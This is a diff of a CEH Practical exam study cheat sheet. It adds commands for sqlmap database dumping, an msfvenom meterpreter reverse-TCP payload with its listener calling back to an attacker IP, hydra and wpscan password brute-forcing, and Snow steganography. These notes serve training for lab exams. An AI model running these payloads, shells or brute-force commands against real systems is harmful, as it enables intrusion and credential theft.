@@ -3,9 +3,9 @@
 # CEH-Practical-Notes-and-Tools
 Successfully completed the CEH (Practical) exam by EC-Council with a score of 20/20! Took me around 2 hours 20 minutes to complete the 6 hour proctored exam.  Just a typical CTF Player/Hacker going back to basics 💻
 
-# Network
+# Network Hacking
 <details>
-  <summary>Network</summary>
+  <summary>Network </summary>
   
 ## Netdiscover
   
@@ -39,12 +39,19 @@ nmap -Pn -A x.x.x.1/24 -vv --open
 * 3306      - MYSQL
 </details>
 
-# Web
+# Web Hacking
 <details>
-  <summary>Web Hacking</summary>
-  
-## File Upload Vulnerability
+  <summary>Web</summary>
 
+* To verify Website's Ip
+```console
+nslookup wwww.example.com
+```
+  
+
+  
+  ## File Upload Vulnerability
+  
 * To create a PHP Payload 
 * Copy the PHP code and create a .php
   
@@ -61,10 +68,65 @@ set LHOST = attacker-ip
 set LPORT = attcker-port
 run
 ```
-
-
   
-##
+* To find the secret file 
+```console
+  type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
+```
+
+ 
+  
+  ## SQL Injection
+  
+  * Login bypass with [' or 1=1 --]
+ 
+### SQLMAP
+  
+* List databases, add cookie values
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
+```
+* OR
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
+```
+
+* List Tables, add databse name
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
+```
+* List Columns of that table
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
+```
+* Dump all values of the table
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
+```
+
+
+
+</details>
+
+# System Hacking
+
+<details>
+  <summary>System</summary>
+
+  * To create a Payload 
+```console
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
+```
+* To take a reverse TCP connection from windows
+```console
+msfdb init && msfconsole 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST= attacker-IP  
+set LPORT= attacker-Port 
+run
+```
+
 </details>
 
 # Android Hacking
@@ -130,7 +192,67 @@ sdcard/Download/secret.txt
 ```  
 </details>
 
+# Password Cracking
 
+<details>
+  <summary>Password Cracking</summary>
+
+## Wordpress
+
+* Wordpress site only Users Enumeration
+```console
+wpscan --url http://example.com/ceh --enumerate u
+```
+  * Direct crack if we have user/password detail
+```console
+wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+wpscan --url http://ip:8080/CEH -u <user> -P ~/wordlists/password.txt
+```
+## Hydra
+### SSH
+```console
+hydra -l username -P passlist.txt 192.168.0.100 ssh
+```
+### FTP
+```console
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
+```
+* If the service isn't running on the default port, use -s
+```console
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+```
+* FTP Get command
+```console
+get flag.txt ~/Desktop/filepath/flag.txt
+```
+### TELNET
+```console
+hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet
+```  
+</details>
+  
+# Steganography
+  <details>
+    <summary>Snow</summary>
+
+### Snow
+    
+* Whitespace Steganography using [Snow](https://darkside.com.au/snow/snwdos32.zip)
+* To hide the Text  
+  
+```console
+SNOW.EXE -C -p test -m "Secret Message" original.txt hide.txt
+```
+
+* To unhide the Hidden Text
+
+```console
+SNOW.EXE -C -p test hide.txt
+```
+<img src="Snow.png"/>
+
+</details>
+ 
 # File Transfer
 <details>
   <summary>File Transfer</summary>
@@ -196,3 +318,7 @@ cp /root/Desktop/filename /var/www/html/share/
 ## Links
 * [hash.com](https://hashes.com/en/decrypt/hash) is a online hash Identifier and Cracker 
 </details>
+
+Final Words: Grab a cup of Tea and GRIND!!!
+
+  <img src = "motivation.jpg"/>
